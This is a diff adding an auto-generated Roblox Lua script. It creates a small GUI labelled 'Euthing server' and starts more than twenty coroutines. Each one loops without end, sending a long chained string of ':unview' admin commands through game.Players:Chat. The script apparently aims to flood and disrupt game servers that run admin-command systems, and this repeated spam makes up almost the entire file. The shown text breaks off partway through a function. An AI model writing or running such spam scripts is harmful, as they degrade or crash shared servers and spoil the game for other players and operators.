@@ -1,1 +1,1105 @@
-fd
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local test32135423 = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+
+--Properties:
+
+test32135423.Name = "test32135423"
+test32135423.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+test32135423.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = test32135423
+Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.309486777, 0, 0.230099499, 0)
+Frame.Size = UDim2.new(0, 100, 0, 100)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 100, 0, 50)
+TextLabel.Font = Enum.Font.SourceSans
+TextLabel.Text = "Euthing server"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 14.000
+
+-- Scripts:
+
+local function FJSLU_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(FJSLU_fake_script)()
+local function CJIB_fake_script() -- Frame.z 
+	local script = Instance.new('LocalScript', Frame)
+
+	local a = script.Parent.TextLabel
+	wait(3.5336)
+	a.Text = ("Done")
+end
+coroutine.wrap(CJIB_fake_script)()
+local function RZRI_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(RZRI_fake_script)()
+local function XBKCX_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(XBKCX_fake_script)()
+local function JYZBXRS_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(JYZBXRS_fake_script)()
+local function EGACVFR_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(EGACVFR_fake_script)()
+local function HKXRXI_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(HKXRXI_fake_script)()
+local function XLPW_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(XLPW_fake_script)()
+local function YZWKCML_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(YZWKCML_fake_script)()
+local function PIQHFZ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PIQHFZ_fake_script)()
+local function NDTXJ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(NDTXJ_fake_script)()
+local function ZJUEE_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(ZJUEE_fake_script)()
+local function ZVLXU_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(ZVLXU_fake_script)()
+local function EHWGLWP_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(EHWGLWP_fake_script)()
+local function BYYVC_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(BYYVC_fake_script)()
+local function MPQOTQ_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(MPQOTQ_fake_script)()
+local function DLFDUO_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(DLFDUO_fake_script)()
+local function PDMEEV_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(PDMEEV_fake_script)()
+local function ZVLS_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(ZVLS_fake_script)()
+local function KKNR_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(KKNR_fake_script)()
+local function VMKOEDG_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(VMKOEDG_fake_script)()
+local function CXHHEF_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
+		game.Players:Chat(":unview |!wait 1.3 |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview |:unview |!wait 1.3 |:unview")
+	end
+	
+end
+coroutine.wrap(CXHHEF_fake_script)()
+local function CZZHD_fake_script() -- Frame.dadmin 
+	local script = Instance.new('LocalScript', Frame)
+
+	
+	
+	while task.wait() do
